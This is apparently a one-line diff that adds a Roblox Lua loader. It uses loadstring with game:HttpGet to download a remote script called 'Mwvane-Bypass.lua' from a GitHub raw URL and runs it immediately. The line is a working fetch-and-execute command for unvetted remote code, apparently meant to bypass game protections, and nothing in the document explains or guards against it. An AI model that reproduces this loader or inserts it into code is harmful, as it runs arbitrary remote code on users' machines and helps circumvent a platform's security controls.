@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/api-jnkie-com/script/main/Mwvane-Bypass.lua"))()
